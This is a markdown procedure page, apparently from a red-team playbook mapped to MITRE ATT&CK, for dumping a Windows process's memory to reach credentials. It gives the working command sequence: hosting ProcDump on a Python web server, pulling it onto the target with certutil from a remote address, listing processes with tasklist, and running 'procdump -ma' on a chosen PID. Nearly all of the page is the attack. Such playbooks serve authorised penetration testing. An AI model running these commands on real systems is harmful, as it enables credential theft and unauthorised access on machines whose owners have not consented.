---
id: ac7e1aa8-3963-4085-b44c-219cfc0c05d8
name: Dump a Process's Memory (cmd.exe)
type: procedure
verified: true
submitted: true
created_at: '2020-01-02T18:45:14.141646+00:00'
updated_at: '2023-05-25T19:54:03.240629+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
platforms:
- Windows
tags:
- '[[data exposure]]'
- '[[memory]]'
commands:
- '[[certutil.exe -urlcache -split -f "http://$_REMOTE_]]'
- '[[Download from a Remote HTTP Server (certutil)]]'
- '[[Launch a Python 3 Web Server]]'
- '[[ProcDump Dump the Memory of a Process]]'
- '[[Tasklist.exe List Running Processes]]'
---

# Dump a Process's Memory (cmd.exe)

**Status**: ✓ Verified

## Summary

Dump a process's memory using Sysinternals suite's Procdump into a file. 

## Description

# Description

Dump a process's memory using Sysinternals suite's Procdump into a file. 

# Instructions

1. Download ProcDump: [Download from Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

2. Copy procdump.exe or procdump64.exe to the target, depending on the architecture.

Host ProcDump on a Python 3 Server

**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```

Download ProcDump to the target

**Command** ([[certutil.exe -urlcache -split -f "http://$_REMOTE_]]):

```bash
certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" $_FILENAME
```

3. List Processes to identify a target's PID.

**Command** ([[Tasklist.exe List Running Processes]]):

```bash
tasklist.exe
```

4. Dump the memory using the PID.

**Command** ([[ProcDump Dump the Memory of a Process]]):

```bash
procdump.exe -ma $_PID $_OUTPUT.dmp
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[certutil.exe -urlcache -split -f "http://$_REMOTE_]]
- [[Download from a Remote HTTP Server (certutil)]]
- [[Launch a Python 3 Web Server]]
- [[ProcDump Dump the Memory of a Process]]
- [[Tasklist.exe List Running Processes]]

## Tags

- [[data exposure]]
- [[memory]]
